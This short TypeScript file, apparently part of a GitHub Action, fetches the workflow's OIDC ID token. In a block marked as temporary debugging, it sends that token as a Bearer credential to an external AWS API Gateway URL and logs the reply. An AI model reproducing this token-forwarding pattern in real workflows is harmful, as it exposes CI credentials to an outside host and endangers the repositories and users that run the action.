import * as core from "@actions/core";

export async function getGithubAccessToken(): Promise<string> {
  const idToken = await core.getIDToken();

  // tmp for debugging
  const response = await fetch(
    "https://8iys2kexcg.execute-api.us-east-1.amazonaws.com/dev/verify",
    {
      method: "GET",
      headers: {
        Authorization: `Bearer ${idToken}`,
      },
    },
  );

  const data = await response.json();

  core.debug(`GitHub access verification: ${JSON.stringify(data, null, 2)}`);

  return idToken;
}
